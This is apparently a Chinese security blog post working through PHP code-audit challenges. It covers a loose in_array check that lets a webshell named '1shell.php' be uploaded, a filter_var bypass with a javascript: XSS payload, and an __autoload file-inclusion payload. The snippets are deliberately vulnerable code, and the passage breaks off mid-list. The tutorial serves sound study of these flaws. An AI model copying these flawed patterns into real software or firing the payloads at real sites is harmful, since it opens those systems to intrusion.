@@ -1,0 +1,911 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>[代码审计]代码审计小挑战 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="[代码审计]代码审计小挑战">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-19 12:09" pubdate>
+        2020年5月19日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      97
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[代码审计]代码审计小挑战</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h2 id="１-前言"><a href="#１-前言" class="headerlink" title="１.前言"></a>１.前言</h2><p>​    最近除了刷题，还想找个事做做，随后想到了代码审计这一方面好久没进行了，就想着去把红日安全－代码审计小组的php代码审计项目给搞一搞。来扩充知识面（不然我代码审计老是只能找类似xss这种。。。）</p>
+<h2 id="２-Part1"><a href="#２-Part1" class="headerlink" title="２.Part1"></a>２.Part1</h2><h3 id="１-Day01-in-array函数缺陷"><a href="#１-Day01-in-array函数缺陷" class="headerlink" title="１.Day01(in_array函数缺陷 )"></a>１.Day01(in_array函数缺陷 )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Challenge</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> UPLOAD_DIRECTORY = <span class="hljs-string">&#x27;./solutions/&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$whitelist</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;whitelist = range(<span class="hljs-number">1</span>, <span class="hljs-number">24</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-keyword">$this</span>-&gt;whitelist)) &#123;<br>            move_uploaded_file(<br>                <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<br>                <span class="hljs-built_in">self</span>::UPLOAD_DIRECTORY . <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            );<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$challenge</span> = <span class="hljs-keyword">new</span> Challenge(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;solution&#x27;</span>]);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure>
+<p>代码执行的流程：</p>
+<p>１．构建一个Challenge类。</p>
+<p>２．Challenge类定义两个私有变量file和whitelist和定义一个常量UPLOAD_DIRECTORY，定义该常量是用来上传文件存储位置的。同时该类定义了两个魔术方法<code>__construct()</code>和<code>__destruct()</code></p>
+<p><code>__construct()　　- 在每次创建新对象时先调用此方法</code></p>
+<p><code>__destruct() 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</code></p>
+<p>３．<code>__construct()</code>方法用来对类中定义的两个私有变量进行赋值，<code>__destruct()</code>方法是用<code>in_array()</code>对上传的文件名进行检查，检查文件名是否是范围1-24之间的整数值。</p>
+<p>４．<strong>问题点：</strong>问题就在in_array()方法，我们来看看in_array的相关定义。如果第三个参数值是TRUE的话，则会进行强检查，这本身是没问题的，问题在于第三个参数值默认是<strong>false</strong>，因此不会进行强检查，存在<strong>弱类型比较</strong>。即将上传的文件名自动转化为整形与整数1-24进行比较。这就导致我们可以将恶意文件上传至服务器，只要文件名为数字1-24开头的文件，都可以上传至服务器。</p>
+<blockquote>
+<p> in_array ：(PHP 4, PHP 5, PHP 7)</p>
+<p>功能 ：检查数组中是否存在某个值</p>
+<p>定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) </p>
+<p>在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。</p>
+</blockquote>
+<p>５．漏洞测试</p>
+<p>demo：day1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;reader<span class="hljs-string">&#x27;s demo1&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;form action=&quot;day1.php&quot; method=&quot;post&quot;  enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;file&quot; name=&quot;solution&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">class Challenge &#123;</span><br><span class="hljs-string">    const UPLOAD_DIRECTORY = &#x27;</span>/<span class="hljs-keyword">var</span>/www/html/php_bugs/solutions/<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">    private $file;</span><br><span class="hljs-string">    private $whitelist;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    public function __construct($file) &#123;</span><br><span class="hljs-string">        $this-&gt;file = $file;</span><br><span class="hljs-string">        $this-&gt;whitelist = range(1, 24);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    public function __destruct() &#123;</span><br><span class="hljs-string">        if (in_array($this-&gt;file[&#x27;</span>name<span class="hljs-string">&#x27;], $this-&gt;whitelist)) &#123;</span><br><span class="hljs-string">            move_uploaded_file(</span><br><span class="hljs-string">                $this-&gt;file[&#x27;</span>tmp_name<span class="hljs-string">&#x27;],</span><br><span class="hljs-string">                self::UPLOAD_DIRECTORY . $this-&gt;file[&#x27;</span>name<span class="hljs-string">&#x27;]</span><br><span class="hljs-string">            );</span><br><span class="hljs-string">            echo &#x27;</span>success<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">        &#125;else&#123;</span><br><span class="hljs-string">            echo &quot;fail to upload!&quot;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$challenge = new Challenge($_FILES[&#x27;</span>solution<span class="hljs-string">&#x27;]);</span><br><span class="hljs-string">//show_source(__FILE__);</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br></code></pre></td></tr></table></figure>
+<p>首先上传文件名为shell.php的小马，可以看到断点没有反应和文件夹并没有shell.php</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/1.png" srcset="/img/loading.gif"></p>
+<p>我们在上传文件名为1shell.php的小马。成功上传</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/2.png" srcset="/img/loading.gif"></p>
+<p>６．漏洞修复：本关漏洞主要就在于<strong>in_array</strong>方法的第三个参数未设置，如果设置为true，则会检查搜索的数据与数组的值的类型是否相同，所以修正该漏洞的方法就是将第三个参数设置为true</p>
+<p>1shell.php上传失败了</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/3.png" srcset="/img/loading.gif"></p>
+<h3 id="２-Day02-filter-var函数缺陷"><a href="#２-Day02-filter-var函数缺陷" class="headerlink" title="２.Day02(filter_var函数缺陷)"></a>２.Day02(filter_var函数缺陷)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// composer require &quot;twig/twig&quot;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;vendor/autoload.php&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$twig</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$indexTemplate</span> = <span class="hljs-string">&#x27;&lt;img &#x27;</span> .<br>            <span class="hljs-string">&#x27;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#x27;</span> .<br>            <span class="hljs-string">&#x27;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide »&lt;/a&gt;&#x27;</span>;<br><br>        <span class="hljs-comment">// Default twig setup, simulate loading</span><br>        <span class="hljs-comment">// index.html file from disk</span><br>        <span class="hljs-variable">$loader</span> = <span class="hljs-keyword">new</span> Twig\Loader\ArrayLoader([<br>            <span class="hljs-string">&#x27;index.html&#x27;</span> =&gt; <span class="hljs-variable">$indexTemplate</span><br>        ]);<br>        <span class="hljs-keyword">$this</span>-&gt;twig = <span class="hljs-keyword">new</span> Twig\Environment(<span class="hljs-variable">$loader</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNexSlideUrl</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$nextSlide</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nextSlide&#x27;</span>];<br>        <span class="hljs-keyword">return</span> filter_var(<span class="hljs-variable">$nextSlide</span>, FILTER_VALIDATE_URL);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;twig-&gt;render(<br>            <span class="hljs-string">&#x27;index.html&#x27;</span>,<br>            [<span class="hljs-string">&#x27;link&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;getNexSlideUrl()]<br>        );<br>    &#125;<br>&#125;<br><br>(<span class="hljs-keyword">new</span> Template())-&gt;render();<br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure>
+<p>１．这题涉及了PHP的Twig模板语言，起到了渲染的作用。但是这并不是今天的主题。</p>
+<p>２．我们可以控制的变量是$nextSlide，这个变量经过了一个函数<strong>filter_var</strong>的处理。</p>
+<blockquote>
+<p>定义和用法<br>filter_var() 函数通过指定的过滤器过滤一个变量。</p>
+<p>如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。</p>
+<p>语法<br>filter_var(variable, filter, options)</p>
+<p>参数    描述<br>variable    必需。规定要过滤的变量。<br>filter    可选。规定要使用的过滤器的 ID。默认是 FILTER_SANITIZE_STRING。参见 完整的 PHP Filter 参考手册，查看可能的过滤器。<br>过滤器 ID 可以是 ID 名称（比如 FILTER_VALIDATE_EMAIL）或 ID 号（比如 274）。</p>
+<p>options    可选。规定一个包含标志/选项的关联数组或者一个单一的标志/选项。检查每个过滤器可能的标志和选项</p>
+</blockquote>
+<p>３．这个函数的作用是根据指定过滤器的ID号对传入的参数进行过滤，这里过滤器是<code>IDFILTER_VALIDATE_URL</code>，所以整个函数的作用是检查变量$nextSlide是否是一个合法的URL。</p>
+<p>４．我们可以写个demo来判断该方法过滤器的规则</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/4.png" srcset="/img/loading.gif"></p>
+<p>５．通过上面的demo，我们可以发现该<code>IDFILTER_VALIDATE_URL</code>过滤器规则是通过检查是否存在<code>字符串://字符串</code>来检查是否为合法url。</p>
+<p>６．检查完后的url，会经过Twig模板中escape过滤器再次过滤，过滤方法跟PHP中的**htmlspecialchars()**方法差不多。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/6.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/5.png" srcset="/img/loading.gif"></p>
+<p>７．看了一下题解，这关存在<strong>XSS</strong>漏洞，我们知道在javascript中<code>//</code>是表示注释，<code>%250a和%0a</code>在浏览器中表示换行，那么我们就可以构造一下payload： </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?nextSlide=javascript:<span class="hljs-regexp">//</span>comment%<span class="hljs-number">250</span>aalert(<span class="hljs-regexp">/xss/</span>)<br></code></pre></td></tr></table></figure>
+<p>因为<code>//</code>表示注释，所以<strong>comment</strong>被注释，换行后执行<code>alert(/xss/)</code>，即执行： </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">javascript:<span class="hljs-regexp">//</span>comment<br>alert(<span class="hljs-regexp">/xss/</span>)<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="3-Day03-实例化任意对象漏洞"><a href="#3-Day03-实例化任意对象漏洞" class="headerlink" title="3.Day03(实例化任意对象漏洞)"></a>3.Day03(实例化任意对象漏洞)</h3><p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://nikoeurus.github.io/2019/03/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP-Security/#Day04">Somnus的博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2018/07/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day3%20-%20%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/#Day-3-Snow-Flake">Mochazz’s blog</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$className</span></span>) </span>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$className</span>;<br>&#125;<br><br><span class="hljs-variable">$controllerName</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (class_exists(<span class="hljs-variable">$controllerName</span>)) &#123;<br>    <span class="hljs-variable">$controller</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$controllerName</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;t&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;v&#x27;</span>]);<br>    <span class="hljs-variable">$controller</span>-&gt;render();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;There is no page with this name&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomeController</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$variables</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>, <span class="hljs-variable">$variables</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;template = <span class="hljs-variable">$template</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;variables = <span class="hljs-variable">$variables</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;variables[<span class="hljs-string">&#x27;new&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;controller rendering new response&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;controller rendering old response&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞主要出现在<code>class_exists()</code>方法，用来检测类是否已经定义。<strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果在本程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，而在这道题中<code>__autoload()方法</code>中存在<code>include()方法的调用</code>，并且调用的目标<code>$className</code>就是我们可以控制的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">class_exists ：(PHP <span class="hljs-number">4</span>, PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>)<br><br>功能 ：检查类是否已定义<br><br>定义 ： <span class="hljs-keyword">bool</span> class_exists ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$class_name</span>[, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$autoload</span> = <span class="hljs-literal">true</span> ] )<br><br><span class="hljs-variable">$class_name</span> 为类的名字，在匹配的时候不区分大小写。默认情况下 <span class="hljs-variable">$autoload</span> 为 <span class="hljs-literal">true</span> ，当 <span class="hljs-variable">$autoload</span> 为 <span class="hljs-literal">true</span> 时，会自动加载本程序中的 __autoload 函数；当 <span class="hljs-variable">$autoload</span> 为 <span class="hljs-literal">false</span> 时，则不调用 __autoload 函数。<br></code></pre></td></tr></table></figure>
+<p>因此我们可以通过文件包含+路径穿越漏洞达到包含想要包含的文件的目的。</p>
+<p><strong>注意：</strong>路径穿越符号的前提是 <code>PHP5~5.3(包含5.3版本)版本</code> ，我在这里吃了好大的亏，我本地搭建的是<code>php5.6</code>的漏洞环境，因此一直没成功，后来才发现。</p>
+<p>payload:<code>?c=./phpinfo.php</code></p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/8.png" srcset="/img/loading.gif"></p>
+<p>根据Somnus学长的搜集，以下的函数也会调用<code>__autoload()方法</code></p>
